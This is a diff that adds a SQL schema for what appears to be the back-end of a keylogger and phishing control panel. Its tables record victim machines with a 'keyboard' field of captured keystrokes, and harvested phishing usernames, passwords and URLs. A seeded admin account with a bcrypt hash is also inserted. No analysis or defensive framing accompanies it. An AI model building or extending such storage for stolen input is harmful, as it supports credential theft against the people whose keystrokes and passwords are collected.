@@ -1,0 +1,30 @@
+CREATE TABLE userronin (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ login varchar(30),
+ pass varchar(32),
+ mail varchar(80),
+ last_ip varchar(15),
+ owner varchar(12),
+ created_at TIMESTAMP,
+ updated_at TIMESTAMP
+);
+
+CREATE TABLE machine_report (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ name varchar(30),
+ date varchar(30),
+ system varchar(64),
+ ip varchar(32),
+ keyboard TEXT
+);
+
+CREATE TABLE phishing (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ name varchar(128),
+ password varchar(128),
+ date varchar(30),
+ url varchar(30)
+);
+
+INSERT INTO "userronin" (login,pass,owner) VALUES ('admin', '$2a$12$YoZTUHs9/SFD9OzvAWPUbePYLHDBcC3egmanr9h5pJO0UgvUwTWcq', 'admin');
+
